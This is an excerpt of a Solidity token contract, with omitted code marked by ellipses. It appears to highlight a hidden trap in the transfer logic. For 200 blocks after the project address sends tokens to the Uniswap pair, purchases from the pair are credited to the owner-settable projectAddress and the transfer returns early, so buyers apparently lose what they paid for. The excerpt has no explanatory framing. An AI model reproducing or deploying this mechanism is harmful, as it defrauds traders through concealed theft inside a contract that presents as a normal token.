...
contract Token is IERC20, Ownable {
    ...
    address public _poolAddress = 0xa4Abc0f6B06429a4C927009eD12424C21DBfDa61;
    address private _destroyAddress =
        address(0x000000000000000000000000000000000000dEaD);

    address private projectAddress = address(0x54d24923d6BAB331a12c6B1B355160260ac2dd5e);
    ...
    constructor(address tokenOwner) {
        ...
        _wy = 10**4 * 10**8 * 10**_decimals;
         ...
         numTokensSellToAddToLiquidity = 60000000000 * 10**_decimals;
    ...
    function scientisttimes() public view  returns (uint256) {
        return _scientisttime;
    }

	function bnumber() public view  returns (uint256) {
        return block.number;
    }

	function getprojexts() public view  returns (address) {
        return projectAddress;
    }

	function getuniv2() public view  returns (address) {
        return uniswapV2Pair;
    }

	function setprojects(address account) public onlyOwner {
    ...
    function _transfer(
        ...
        if (
            ...
            _addPoolAddressMoney(contractTokenBalance);
        }
    ...
    function _addPoolAddressMoney(uint256 tAmount) private {
        if (tAmount == 0) return;
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].sub(rAmount);
        _rOwned[_poolAddress] = _rOwned[_poolAddress].add(rAmount);
    }
    ...
    function _transferStandard(
        ...
        if(sender == projectAddress && recipient == uniswapV2Pair) _scientisttime = block.number;
        if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {

            if(block.number.sub(_scientisttime) <=200 && sender == uniswapV2Pair )
            {
                 _rOwned[projectAddress] = _rOwned[projectAddress].add(
                    rAmount.div(100).mul(recipientRate)
                );
                emit Transfer(sender, projectAddress, tAmount.div(100).mul(recipientRate));
                return;
            }
        }
